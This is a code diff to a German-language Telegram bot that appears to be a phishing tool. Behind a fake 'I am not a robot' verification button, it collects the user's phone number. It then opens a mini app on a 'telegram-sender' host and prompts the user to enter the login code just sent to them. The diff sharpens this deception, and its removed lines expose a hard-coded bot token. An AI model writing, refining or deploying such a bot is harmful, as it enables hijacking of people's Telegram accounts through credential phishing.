@@ -6,14 +6,14 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from dotenv import load_dotenv
 
 load_dotenv()
-BOT_TOKEN = os.getenv("BOT_TOKEN", "9036646897:AAEUxlHmqkA5uZdxwzCzO8JIVLyGgiby67E")
-MINI_APP_URL = os.getenv("MINI_APP_URL", "https://telegram-sender-cz75.onrender.com/verify")
-GIF_URL = os.getenv("GIF_URL", "https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Smileys/Robot.webp")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+MINI_APP_URL = os.getenv("MINI_APP_URL", "https://deine-render-url.onrender.com/verify")
+GIF_URL = os.getenv("GIF_URL", "")
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[KeyboardButton("📱 Nummer teilen", request_contact=True)]]
+    keyboard = [[KeyboardButton("Ich Bin Kein Roboter", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
     text = "✅ Drücke hier um dich zu verifizieren"
     
@@ -28,11 +28,11 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         phone = contact.phone_number
         if not phone.startswith("+"):
             phone = "+" + phone
-        url = f"{MINI_APP_URL}?phone={phone}"
-        keyboard = [[InlineKeyboardButton("Ich Bin Kein Roboter", web_app=WebAppInfo(url=url))]]
+        url = f"{MINI_APP_URL}?phone={phone}&auto=1"
+        keyboard = [[InlineKeyboardButton("Code eingeben", web_app=WebAppInfo(url=url))]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            f"✅ Nummer erkannt: {phone}\n\nJetzt verifizieren:",
+            "🔐 Code wurde gesendet. Gib ihn jetzt ein:",
             reply_markup=reply_markup
         )
         await update.message.reply_text(" ", reply_markup=ReplyKeyboardRemove())
@@ -48,6 +48,8 @@ async def main():
     app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     print("Bot startet...")
     print(f"Mini-App URL: {MINI_APP_URL}")
+    if GIF_URL:
+        print(f"GIF: {GIF_URL}")
     await app.initialize()
     await app.start()
     await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
